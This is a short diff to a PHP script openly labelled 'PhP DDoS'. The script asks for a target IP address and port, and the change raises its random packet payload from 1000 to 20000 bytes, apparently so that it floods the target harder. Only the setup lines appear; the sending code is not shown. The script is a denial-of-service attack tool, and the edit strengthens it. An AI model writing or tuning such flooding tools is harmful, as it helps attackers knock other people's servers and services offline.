@@ -6,7 +6,7 @@ echo "Script By JeanLeKhey | PhP DDoS";
 echo "\n";
 $ip = readline("IP : ");
 $port = readline("Port : ");
-$packets = random_bytes(1000);
+$packets = random_bytes(20000);
 $len = strlen($packets);
 
 echo "----------------";
